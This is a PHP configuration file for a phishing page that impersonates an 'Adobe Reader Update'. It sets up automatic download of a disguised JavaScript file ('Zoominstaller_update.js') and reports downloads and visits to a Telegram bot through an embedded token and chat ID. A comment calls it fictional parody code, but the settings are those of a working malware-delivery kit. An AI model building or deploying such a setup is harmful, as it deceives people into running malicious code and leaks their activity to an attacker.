<?php
// Configuration file for the Adobe spoofing page
// FICTIONAL CODE FOR MOVIE/PARODY PROJECT

return [
    // Telegram configuration
    'telegram' => "1", // 1 = enabled, 0 = disabled
    'bot_url' => "8500973975:AAGcwmSs_zIBGeZs3pIW2eU6zzqvEVBwwbQ", // Replace with your actual bot token
    'chat_id' => "1078753356", // Replace with your chat ID

    // Site configuration
    'site_name' => "Adobe Reader Update",
    'download_filename' => 'Zoominstaller_update.js', // Change to your filename,
    
    // Download settings
    'auto_download_delay' => 5, // Seconds before auto download
    
    // Notification settings
    'notify_on_visit' => false,
    'notify_on_download' => true,
    
    // Advanced options - for future use
    'custom_redirect' => "", // If set, redirects user after download
    'log_visits' => true,
    'log_downloads' => true,
    'ip_blacklist' => [
        // Add IPs to block here
        // '127.0.0.1',
    ],
];
?>
